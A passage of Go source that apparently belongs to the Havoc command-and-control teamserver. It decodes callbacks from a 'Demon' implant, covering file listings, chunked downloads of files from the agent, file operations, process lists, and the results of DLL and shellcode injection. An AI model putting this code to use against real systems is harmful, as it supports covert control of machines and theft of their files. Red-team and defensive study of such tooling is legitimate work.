						Explorer  = Parser.ParseBool()
						ListOnly  = Parser.ParseBool()
						StartPath = Parser.ParseUTF16String()
						Success   = Parser.ParseBool()
						ReadOne   = false
						Dir       string
						DirMap    = make(map[string]any)
						DirArr    []map[string]string
						WhatToRead []parser.ReadType
					)

					if ! Success {
						Output["Type"] = "Error"
						Output["Message"] = "Failed to enumerate files/folders at specified path: " + StartPath
					} else {
						IsFirst := true
						if ListOnly {
							WhatToRead = []parser.ReadType{parser.ReadBytes}
						} else {
							WhatToRead = []parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt64}
						}
						for Parser.CanIRead(WhatToRead) {
							var (
									RootDirPath   = Parser.ParseUTF16String()
									NumFiles      = Parser.ParseInt32()
									NumDirs       = Parser.ParseInt32()
									TotalFileSize int64 = 0
									ItemsLeft     = NumFiles + NumDirs
								)
							if !ListOnly {
								TotalFileSize = Parser.ParseInt64()
							}

							if !ListOnly && !Explorer && NumFiles + NumDirs > 0 {
								if IsFirst {
									IsFirst = false
									Dir += fmt.Sprintf(" Directory of %s:\n\n", RootDirPath)
								} else {
									Dir += fmt.Sprintf("\n\n Directory of %s:\n\n", RootDirPath)
								}
							}

							for (ItemsLeft > 0 && ((ListOnly && Parser.CanIRead([]parser.ReadType{parser.ReadBytes})) || (!ListOnly && Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBool, parser.ReadInt64, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32})))) {

								var (
									FileName         = Parser.ParseUTF16String()
									IsDir            = false
									FileSize         int64 = 0
									LastAccessDay    = 0
									LastAccessMonth  = 0
									LastAccessYear   = 0
									LastAccessMinute = 0
									LastAccessHour   = 0

									Size         string
									Type         string
									LastModified string
									DirText      string
								)

								if !ListOnly {
									IsDir            = Parser.ParseBool()
									FileSize         = Parser.ParseInt64()
									LastAccessDay    = Parser.ParseInt32()
									LastAccessMonth  = Parser.ParseInt32()
									LastAccessYear   = Parser.ParseInt32()
									LastAccessMinute = Parser.ParseInt32()
									LastAccessHour   = Parser.ParseInt32()
								}

								ReadOne = true

								if ListOnly {
									Dir += fmt.Sprintf("%s%s\n", RootDirPath[:len(RootDirPath)-1], FileName)
								} else {
									LastModified = fmt.Sprintf("%02d/%02d/%d  %02d:%02d", LastAccessDay, LastAccessMonth, LastAccessYear, LastAccessHour, LastAccessMinute)
									if IsDir {
										Type = "dir"
										DirText = "<DIR>"
										Size    = ""
									} else {
										DirText = ""
										Size    = common.ByteCountSI(int64(FileSize))
									}

									if Explorer {
										DirArr = append(DirArr, map[string]string{
											"Type":     Type,
											"Size":     Size,
											"Modified": LastModified,
											"Name":     FileName,
										})
									} else {
										Dir += fmt.Sprintf("%-17s    %-5s  %-12s   %-8s\n", LastModified, DirText, Size, FileName)
									}
								}

								ItemsLeft -= 1
							}

							if NumFiles + NumDirs > 0 && !Explorer && !ListOnly {
								Dir += fmt.Sprintf("               %d File(s)     %s\n", NumFiles, common.ByteCountSI(TotalFileSize))
								Dir += fmt.Sprintf("               %d Folder(s)", NumDirs)
							}

							if Explorer {
								DirMap["Path"] = []byte(RootDirPath)
								DirMap["Files"] = DirArr

								DirJson, err := json.Marshal(DirMap)
								if err != nil {
									logger.Debug("[Error] " + err.Error())
								} else {
									Output["MiscType"] = "FileExplorer"
									Output["MiscData"] = base64.StdEncoding.EncodeToString(DirJson)
								}
							}
						}

						if !Explorer {
							if ReadOne == false {
								Output["Type"] = "Info"
								Output["Output"] = "No file or folder was found"
							} else {
								Output["Type"] = "Info"
								Output["Output"] = Dir
							}
						}
					}

					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_DIR, Invalid packet", AgentID))
				}

				break

			case DEMON_COMMAND_FS_DOWNLOAD:

				/*
				 * Download Header:
				 *  [ Mode      ] Open ( 0 ), Write ( 1 ) or Close ( 2 )
				 *  [ File ID   ] Download File ID
				 *
				 * Data (Open):
				 *  [ File Size ]
				 *  [ File Name ]
				 *
				 * Data (Write)
				 *  [ Chunk Data ] Size + FileChunk
				 *
				 * Data (Close):
				 *  [ File Name ]
				 *  [  Reason   ] Removed or Finished
				 * */

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
					var (
						Mode   = Parser.ParseInt32()
						FileID = Parser.ParseInt32()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_DOWNLOAD, Mode: %d, FileID: %x", AgentID, Mode, FileID))

					switch Mode {

					/* File Open */
					case 0x0:
						logger.Debug(fmt.Sprintf("Download open FileID:[%x]", FileID))

						if Parser.CanIRead([]parser.ReadType{parser.ReadInt64, parser.ReadBytes}) {
							var (
								FileSize = Parser.ParseInt64()
								FileName = Parser.ParseUTF16String()
								Size     = common.ByteCountSI(FileSize)
							)

							Output["Type"] = "Info"
							Output["Message"] = fmt.Sprintf("Started download of file: %v [%v]", FileName, Size)

							if err := a.DownloadAdd(FileID, FileName, FileSize); err != nil {
								Output["Type"] = "Error"
								Output["Message"] = err.Error()
							} else {
								Output["MiscType"] = "download"
								Output["MiscData2"] = base64.StdEncoding.EncodeToString([]byte(FileName)) + ";" + Size
							}
						} else {
							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_DOWNLOAD, Invalid packet", AgentID))
						}

						break

					case 0x1:
						logger.Debug(fmt.Sprintf("Download write FileID:[%v]", FileID))

						if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
							var FileChunk = Parser.ParseBytes()

							a.DownloadWrite(FileID, FileChunk)
						} else {
							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_DOWNLOAD, Invalid packet", AgentID))
						}

						break

					case 0x2:
						logger.Debug(fmt.Sprintf("Download close FileID:[%v]", FileID))

						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
							var (
								FileName string
								Reason   = Parser.ParseInt32()
							)

							if len(a.Downloads) > 0 {
								var download = a.DownloadGet(FileID)
								if download != nil {
									FileName = download.FilePath
								}

								if Reason == 0x0 {
									Output["Type"] = "Good"
									Output["Message"] = fmt.Sprintf("Finished download of file: %v", FileName)

									a.DownloadClose(FileID)
								} else if Reason == 0x1 {
									Output["Type"] = "Info"
									Output["Message"] = fmt.Sprintf("Download has been removed: %v", FileName)

									a.DownloadClose(FileID)
								}
							} else {
								/* TODO: handle this error. or simply ignore this ? */
							}
							a.RequestCompleted(RequestID)

						} else {
							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_DOWNLOAD, Invalid packet", AgentID))
						}

						break

					default:
						logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - UNKNOWN (%d)", AgentID, Mode))
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_DOWNLOAD, Invalid packet", AgentID))
				}

				break

			case DEMON_COMMAND_FS_UPLOAD:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_UPLOAD", AgentID))

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes}) {
					var (
						FileSize = Parser.ParseInt32()
						FileName = Parser.ParseUTF16String()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_UPLOAD, FileSize: %v, FileName: %v", AgentID, FileSize, FileName))

					Output["Type"] = "Info"
					Output["Message"] = fmt.Sprintf("Uploaded file: %v (%v)", FileName, FileSize)
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_UPLOAD, Invalid packet", AgentID))
					Output["Type"] = "Error"
					Output["Message"] = "Failed to parse FS::Upload response"
				}

				break

			case DEMON_COMMAND_FS_CD:

				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					var Path = Parser.ParseUTF16String()

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_CD, Path: %v", AgentID, Path))

					Output["Type"] = "Info"
					Output["Message"] = fmt.Sprintf("Changed directory: %v", Path)
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_CD, Invalid packet", AgentID))
				}

				break

			case DEMON_COMMAND_FS_REMOVE:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes}) {
					var (
						IsDir = Parser.ParseInt32()
						Path  = Parser.ParseUTF16String()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_REMOVE, IsDir: %d, Path: %v", AgentID, IsDir, Path))

					Output["Type"] = "Info"

					if IsDir == win32.TRUE {
						Output["Message"] = fmt.Sprintf("Removed directory: %v", Path)
					} else {
						Output["Message"] = fmt.Sprintf("Removed file: %v", Path)
					}
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_REMOVE, Invalid packet", AgentID))
				}

				break

			case DEMON_COMMAND_FS_MKDIR:

				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					var Path = Parser.ParseUTF16String()

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_MKDIR, Path: %v", AgentID, Path))

					Output["Type"] = "Info"
					Output["Message"] = fmt.Sprintf("Created directory: %v", Path)
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_MKDIR, Invalid packet", AgentID))
				}

				break

			case DEMON_COMMAND_FS_COPY:
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes, parser.ReadBytes}) {
					var (
						Success  = Parser.ParseInt32()
						PathFrom = Parser.ParseUTF16String()
						PathTo   = Parser.ParseUTF16String()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_COPY, Success: %d, PathFrom: %v, PathTo: %v", AgentID, Success, PathFrom, PathTo))

					if Success == win32.TRUE {
						Output["Type"] = "Good"
						Output["Message"] = fmt.Sprintf("Successful copied file %v to %v", PathFrom, PathTo)
					} else {
						Output["Type"] = "Error"
						Output["Message"] = fmt.Sprintf("Failed to copied file %v to %v", PathFrom, PathTo)
					}
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_COPY, Invalid packet", AgentID))
				}

				break

                        case DEMON_COMMAND_FS_MOVE:
                                if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes, parser.ReadBytes}) {
                                        var (
                                                Success  = Parser.ParseInt32()
                                                PathFrom = Parser.ParseUTF16String()
                                                PathTo   = Parser.ParseUTF16String()
                                        )

                                        logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_MOVE, Success: %d, PathFrom: %v, PathTo: %v", AgentID, Success, PathFrom, PathTo))

                                        if Success == win32.TRUE {
                                                Output["Type"] = "Good"
                                                Output["Message"] = fmt.Sprintf("Successful moved file %v to %v", PathFrom, PathTo)
                                        } else {
                                                Output["Type"] = "Error"
                                                Output["Message"] = fmt.Sprintf("Failed to moved file %v to %v", PathFrom, PathTo)
                                        }
                                        a.RequestCompleted(RequestID)
                                } else {
                                        logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_MOVE, Invalid packet", AgentID))
                                }

                                break


			case DEMON_COMMAND_FS_GET_PWD:

				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					var Path = Parser.ParseUTF16String()

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_GET_PWD, Path: %v", AgentID, Path))

					Output["Type"] = "Info"
					Output["Message"] = fmt.Sprintf("Current directory: %v", Path)
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_GET_PWD, Invalid packet", AgentID))
				}

				break

			case DEMON_COMMAND_FS_CAT:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadBytes}) {
					var (
						FileName    = Parser.ParseUTF16String()
						Success     = Parser.ParseInt32()
						FileContent = Parser.ParseString()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_CAT, FileName: %v, Success: %d", AgentID, FileName, Success))

					if Success == win32.TRUE {
						Output["Type"] = "Info"
						Output["Message"] = fmt.Sprintf("File content of %v (%v):", FileName, len(FileContent))
						Output["Output"] = FileContent
					} else {
						Output["Type"] = "Erro"
						Output["Message"] = fmt.Sprintf("Failed to read file: %v", FileName)
					}

					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_CAT, Invalid packet", AgentID))
					Output["Type"] = "Error"
					Output["Message"] = "Failed to parse fs::cat response"
				}
			default:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - UNKNOWN (%d)", AgentID, SubCommand))
			}

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)

			break
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS, Invalid packet", AgentID))
		}

	case COMMAND_PROC_LIST:
		logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC_LIST", AgentID))
		type Process struct {
			Name      string
			ImagePath string
			PID       string
			PPID      string
			Session   string
			IsWow     int
			Threads   string
			User      string
		}

		var (
			tableData     [][]string
			Processlist   []Process
			processes     int
			Output        = make(map[string]string)
			ProcessUI     = Parser.ParseInt32()
			ProcessTable  string
			ProcessMaxStr int
		)

		for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadBytes}) {
			var (
				collum  []string
				Process Process
			)

			Process.Name = Parser.ParseUTF16String()
			Process.PID = strconv.Itoa(Parser.ParseInt32())
			Process.IsWow = Parser.ParseInt32()
			Process.PPID = strconv.Itoa(Parser.ParseInt32())
			Process.Session = strconv.Itoa(Parser.ParseInt32())
			Process.Threads = strconv.Itoa(Parser.ParseInt32())
			Process.User = Parser.ParseUTF16String()

			var ProcessArch = "x64"
			if Process.IsWow == win32.TRUE {
				ProcessArch = "x86"
			}

			collum = []string{Process.Name, Process.PID, Process.PPID, Process.Session, ProcessArch, Process.Threads, Process.User}

			tableData = append(tableData, collum)
			Processlist = append(Processlist, Process)
			processes++

			if len(Process.Name) > ProcessMaxStr {
				ProcessMaxStr = len(Process.Name)
			}
		}

		FormatTable := fmt.Sprintf(" %%-%vs   %%-4s   %%-4s   %%-7s   %%-5s   %%-7s   %%-4s", ProcessMaxStr)
		ProcessTable += fmt.Sprintf(FormatTable+"\n", "Name", "PID", "PPID", "Session", "Arch", "Threads", "User")
		ProcessTable += fmt.Sprintf(FormatTable+"\n", "----", "---", "----", "-------", "----", "-------", "----")

		for _, process := range Processlist {
			var ProcessArch = "x64"
			if process.IsWow == win32.TRUE {
				ProcessArch = "x86"
			}

			ProcessTable += fmt.Sprintf(FormatTable+"\n", process.Name, process.PID, process.PPID, process.Session, ProcessArch, process.Threads, process.User)
		}

		var ProcessListJson, _ = json.Marshal(Processlist)

		if ProcessUI == win32.FALSE {
			Output["Type"] = "Info"
			Output["Message"] = "Process List:"
			Output["Output"] = "\n" + ProcessTable
		} else {
			logger.Debug("Process UI")
			Output["MiscType"] = "ProcessUI"
			Output["MiscData"] = base64.StdEncoding.EncodeToString(ProcessListJson)
		}
		a.RequestCompleted(RequestID)

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)

	case COMMAND_OUTPUT:
		var Output = make(map[string]string)
		var message string

		if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
			message = Parser.ParseString()
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_OUTPUT, len: %d", AgentID, len(message)))

			Output["Type"] = "Good"
			Output["Output"] = message
			Output["Message"] = fmt.Sprintf("Received Output [%v bytes]:", len(message))
			if len(message) > 0 {
				teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
			}
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_OUTPUT, Invalid packet ", AgentID))
		}

	case BEACON_OUTPUT:

		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			var Type = Parser.ParseInt32()

			switch Type {

			case CALLBACK_OUTPUT:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_OUTPUT", AgentID))

					found := false
					for _, BofCallback := range a.BofCallbacks {
						if BofCallback.TaskID == RequestID {
							// store the output and later send it back to the python module
							BofCallback.Output += Parser.ParseString()
							found = true
							break
						}
					}

					if found == false {
						// simply print the output on the agent console
						var Output = make(map[string]string)
						Output["Type"] = "Good"
						Output["Output"] = Parser.ParseString()
						Output["Message"] = fmt.Sprintf("Received Output [%v bytes]:", len(Output["Output"]))
						if len(Output["Output"]) > 0 {
							teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
						}
					}

					break
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_OUTPUT, Invalid packet", AgentID))
				}

			case CALLBACK_OUTPUT_OEM:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_OUTPUT_OEM", AgentID))

					found := false
					for _, BofCallback := range a.BofCallbacks {
						if BofCallback.TaskID == RequestID {
							// store the output and later send it back to the python module
							BofCallback.Output += Parser.ParseUTF16String()
							found = true
							break
						}
					}

					if found == false {
						// simply print the output on the agent console
						var Output = make(map[string]string)
						Output["Type"] = "Good"
						Output["Output"] = Parser.ParseUTF16String()
						Output["Message"] = fmt.Sprintf("Received Output [%v bytes]:", len(Output["Output"]))
						if len(Output["Output"]) > 0 {
							teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
						}
					}

					break
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_OUTPUT_OEM, Invalid packet", AgentID))
				}

			case CALLBACK_ERROR:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_ERROR", AgentID))

					found := false
					for _, BofCallback := range a.BofCallbacks {
						if BofCallback.TaskID == RequestID {
							// store the output and later send it back to the python module
							BofCallback.Error += Parser.ParseString()
							found = true
							break
						}
					}

					if found == false {
						// simply print the output on the agent console
						var Output = make(map[string]string)
						Output["Type"] = typeError
						Output["Output"] = Parser.ParseString()
						Output["Message"] = fmt.Sprintf("Received Output [%v bytes]:", len(Output["Output"]))
						if len(Output["Output"]) > 0 {
							teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
						}
					}

					break
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_ERROR, Invalid packet", AgentID))
				}

			case CALLBACK_FILE:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					var Data = Parser.ParseBytes()
					if len(Data) > 8 {
						logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE", AgentID))
						var FileID = int(binary.BigEndian.Uint32(Data[0:4]))
						var FileLength = int64(binary.BigEndian.Uint32(Data[4:8]))
						var FileName = string(Data[8:])

						var Output = make(map[string]string)
						Output["Type"] = "Info"
						Output["Message"] = fmt.Sprintf("Started download of file: %v [%v]", FileName, FileLength)
						logger.Debug(Output["Message"])

						if err := a.DownloadAdd(FileID, FileName, FileLength); err != nil {
							Output["Type"] = "Error"
							Output["Message"] = err.Error()
						} else {
							Output["MiscType"] = "download"
							Output["MiscData2"] = base64.StdEncoding.EncodeToString([]byte(FileName)) + ";" + common.ByteCountSI(int64(FileLength))
						}
						teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
					} else {
						logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE, Invalid packet", AgentID))
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE, Invalid packet", AgentID))
				}

				break

			case CALLBACK_FILE_WRITE:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					var Data = Parser.ParseBytes()
					if len(Data) >= 4 {
						logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE_WRITE", AgentID))

						var FileID = int(binary.BigEndian.Uint32(Data[0:4]))
						var FileChunk = Data[4:]

						var err = a.DownloadWrite(FileID, FileChunk)
						if err != nil {
							var Output = make(map[string]string)
							Output["Type"] = "Error"
							Output["Message"] = err.Error()
							teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
						}
					} else {
						logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE_WRITE, Invalid packet", AgentID))
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE_WRITE, Invalid packet", AgentID))
				}

				break

			case CALLBACK_FILE_CLOSE:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					var Data = Parser.ParseBytes()
					if len(Data) >= 4 {
						logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE_CLOSE", AgentID))

						var FileID = int(binary.BigEndian.Uint32(Data[0:4]))

						var download = a.DownloadGet(FileID)
						if download != nil {
							var Output = make(map[string]string)
							Output["Type"] = "Good"
							Output["Message"] = fmt.Sprintf("Finished download of file: %v", download.FilePath)
							teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
						} else {
							logger.Debug("download == nil")
						}

						a.DownloadClose(FileID)

					} else {
						logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE_CLOSE, Invalid packet", AgentID))
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE_CLOSE, Invalid packet", AgentID))
				}

				break

			default:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - UNKNOWN (%d)", AgentID, Type))
			}
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT, Invalid packet", AgentID))
		}

	case COMMAND_INJECT_DLL:

		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			var (
				Status  = Parser.ParseInt32()
				Message = make(map[string]string)
			)

			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INJECT_DLL, Status: %d", AgentID, Status))

			if Status == 0 {
				Message["Type"] = "Good"
				Message["Message"] = "Successful injected reflective dll"
			} else {
				String, ok := InjectErrors[Status]
				if ok {
					String = fmt.Sprintf("Status:[%v]", String)
				}

				Message["Type"] = "Error"
				Message["Message"] = "Failed to inject reflective dll: " + String
			}

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INJECT_DLL, Invalid packet", AgentID))
		}

		break

	case COMMAND_SPAWNDLL:

		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			var (
				Status  = Parser.ParseInt32()
				Message = make(map[string]string)
			)

			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SPAWNDLL, Status: %d", AgentID, Status))

			if Status == 0 {
				Message["Type"] = "Good"
				Message["Message"] = "Successful spawned reflective dll"
			} else {
				String, ok := InjectErrors[Status]
				if ok {
					String = fmt.Sprintf("Status:[%v]", String)
				}

				Message["Type"] = "Error"
				Message["Message"] = "Failed to spawned reflective dll: " + String
			}

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SPAWNDLL, Invalid packet", AgentID))
		}

		break

	case COMMAND_INJECT_SHELLCODE:

		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			var (
				Status  = Parser.ParseInt32()
				Message = make(map[string]string)
			)

			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INJECT_SHELLCODE, Status: %d", AgentID, Status))

			if Status == INJECT_ERROR_SUCCESS {
				Message["Type"] = "Good"
				Message["Message"] = "Successful injected shellcode"
			} else if Status == INJECT_ERROR_FAILED {
				Message["Type"] = "Error"
				Message["Message"] = "Failed to inject shellcode"
			} else if Status == INJECT_ERROR_INVALID_PARAM {
				Message["Type"] = "Error"
				Message["Message"] = "Invalid parameter specified"
			} else if Status == INJECT_ERROR_PROCESS_ARCH_MISMATCH {
				Message["Type"] = "Error"
				Message["Message"] = "Process architecture mismatch"
			} else if Status == INJECT_ERROR_FAILED {
				Message["Type"] = "Error"
				Message["Message"] = "Failed to inject shellcode"
			}

			a.RequestCompleted(RequestID)
			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INJECT_SHELLCODE, Invalid packet", AgentID))
		}

		break

	case COMMAND_PROC:
		var (
			Message    = make(map[string]string)
			SubCommand int
		)
		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {

			SubCommand = Parser.ParseInt32()

			switch SubCommand {
			case DEMON_COMMAND_PROC_MODULES:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - DEMON_COMMAND_PROC_MODULES", AgentID))
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
					var (
						ModuleName string
						ModuleBase string
						ProcessID  = Parser.ParseInt32()

						OutputBuffer bytes.Buffer
						tableData    [][]string
					)

					table := tablewriter.NewWriter(&OutputBuffer)

					table.SetHeader([]string{"Name", "Base Address"})
					table.SetBorder(false)
					table.SetHeaderAlignment(tablewriter.ALIGN_CENTER)

					table.SetRowSeparator("-")
					table.SetColumnSeparator("│")
					table.SetCenterSeparator("+")

					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadPointer}) {
						var (
							collum []string
						)

						ModuleName = Parser.ParseString()
						ModuleBase = "0x" + strconv.FormatInt(Parser.ParsePointer(), 16)

						collum = []string{strings.ReplaceAll(ModuleName, " ", ""), ModuleBase} // TODO: fix this to avoid new line in the havoc console
						tableData = append(tableData, collum)
					}
					table.AppendBulk(tableData)
					table.Render()

					Message["Type"] = "Info"
					Message["Message"] = fmt.Sprintf("List loaded modules/dll from process %v:", ProcessID)
					Message["Output"] = "\n" + OutputBuffer.String()

				} else {
					Message["Type"] = "Error"
					Message["Message"] = "Couldn't list loaded modules/dll from specified process: "
				}
				a.RequestCompleted(RequestID)

				break

			case DEMON_COMMAND_PROC_GREP:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - DEMON_COMMAND_PROC_GREP", AgentID))
				if Parser.Length() > 0 {
					var (
						ProcName  string
						ProcID    int
						ParentPID int
						ProcUser  string
						ProcArch  int

						Output string
					)

					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadBytes, parser.ReadInt32}) {
						ProcName = Parser.ParseUTF16String()
						ProcID = Parser.ParseInt32()
						ParentPID = Parser.ParseInt32()
						ProcUser = Parser.ParseUTF16String()
						ProcArch = Parser.ParseInt32()

						Output += fmt.Sprintf(
							"\n   Process Name : %v\n   Process ID   : %v\n   Parent PID   : %v\n   Process User : %v\n   Process Arch : x%v\n",
							ProcName, ProcID, ParentPID, ProcUser, ProcArch,
						)
					}

					Message["Type"] = "Info"
					Message["Message"] = "Found one or more processes:"
					Message["Output"] = Output

				} else {
					Message["Type"] = "Error"
					Message["Message"] = "Couldn't find specified process"
				}
				a.RequestCompleted(RequestID)

				break

			case DEMON_COMMAND_PROC_CREATE:

				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
					var (
						Path    = Parser.ParseUTF16String()
						PID     = Parser.ParseInt32()
						Success = Parser.ParseInt32()
						Piped   = Parser.ParseInt32()
						Verbose = Parser.ParseInt32()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO - DEMON_INFO_PROC_CREATE, Path: %s, PID: %d, Success: %d, Verbose: %d, Piped: %d", AgentID, Path, PID, Success, Verbose, Piped))

					if Verbose == 1 {
						if Success == 1 {
							Message["Type"] = "Info"
							Message["Message"] = fmt.Sprintf("Process started: Path:[%v] ProcessID:[%v]", Path, PID)
						} else {
							Message["Type"] = "Erro"
							Message["Message"] = fmt.Sprintf("Process could not be started: Path:[%v]", Path)
						}
					}

					if Success == 0 || Piped == 0 {
						// if we don't expect to receive output, then close the RequestID
						a.RequestCompleted(RequestID)
					}
				} else {
